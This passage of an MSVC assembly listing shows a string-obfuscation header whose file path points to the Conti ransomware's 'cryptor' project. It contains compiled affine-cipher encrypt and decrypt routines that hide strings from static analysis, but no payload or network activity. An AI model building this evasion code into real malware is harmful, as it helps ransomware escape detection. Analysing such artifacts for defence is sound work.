  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00425	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00429	88 85 c0 00 00
	00		 mov	 BYTE PTR tv266[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0042f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00436	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0043d	5f		 pop	 rdi
  0043e	5d		 pop	 rbp
  0043f	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 6b	 sub	 eax, 107		; 0000006bH
  0002d	6b c0 dc	 imul	 eax, eax, -36		; ffffffffffffffdcH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 43	 imul	 eax, eax, 67		; 00000043H
  0002d	83 c0 6b	 add	 eax, 107		; 0000006bH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 10	 cmp	 QWORD PTR i$1[rbp], 16
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv210 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
